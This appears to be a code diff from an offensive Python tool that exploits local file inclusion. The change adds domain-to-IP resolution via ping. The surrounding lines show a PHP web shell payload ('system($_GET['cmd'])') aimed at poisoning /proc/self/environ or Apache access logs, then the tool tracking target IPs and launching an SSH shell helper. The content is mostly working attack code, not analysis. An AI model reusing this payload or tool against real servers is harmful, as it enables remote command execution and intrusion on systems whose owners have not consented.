@@ -11,11 +11,20 @@ import os
 import subprocess
 import base64
 import signal
-
+from subprocess import Popen, PIPE, check_output 
 class Shell_conncet:
 
      def __init__(self):
         self.control()
+        if self.args.Domain:
+               domain = str(re.search('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Domain)).split()
+               self.ip_re = (domain[-1][7:-2])
+               self.ip_re = self.ip_re[6:].replace('/','')
+               DisCover = Popen(["ping","-w1",self.ip_re], stdout=PIPE)
+               output   = str(DisCover.communicate()).split()
+               self.ip_re = (output[2]).replace("(",'').replace(')','')
+        else:
+            self.ip_re = self.ip_re.group()
         if "proc/self/environ" in self.url\
         or 'apache2/access.log' in self.url and not self.args.port:                                                                                                          
             self.paylaodPHP = "<?php system($_GET['cmd']); ?>"           
@@ -59,12 +68,12 @@ class Shell_conncet:
                     with open ('./Package/shell/.address','r') as readip:                    
                         IP_IN = readip.read().split('\n')
                         IP_IN = "".join([*set(IP_IN)])
-                        if self.ip_re.group().replace('\n','') in IP_IN :
+                        if self.ip_re.replace('\n','') in IP_IN :
                            pass           
                         else:  
                             
                             with open ('./Package/shell/.address','a') as readip:
-                               IP_IN = readip.write(str(self.ip_re.group()))                                                                                    
+                               IP_IN = readip.write(str(self.ip_re))                                                                                    
                                path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
                                run    =  'gnome-terminal  -e '+'" '+path+' "' 
                                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
@@ -91,7 +100,7 @@ class Shell_conncet:
                                        break       
                 if not os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','a') as readip:
-                         IP_IN = readip.write(str(self.ip_re.group()))                                                                                    
+                         IP_IN = readip.write(str(self.ip_re))                                                                                    
                          path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
                          run    =  'gnome-terminal  -e '+'" '+path+' "' 
                          xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
@@ -106,8 +115,8 @@ class Shell_conncet:
                                     os.kill(int(pid), signal.SIGKILL)    
                                     with open ('./Package/shell/.address','r') as readip: 
                                                readhost = readip.read()
-                                               if self.ip_re.group() in readhost :
-                                                  repalce = readhost.replace(self.ip_re.group(),'')
+                                               if self.ip_re in readhost :
+                                                  repalce = readhost.replace(self.ip_re,'')
                                                   with open ('./Package/shell/.address','w+') as writeIP:
                                                        writeIP =  writeIP.write(repalce)    
                                                else:    
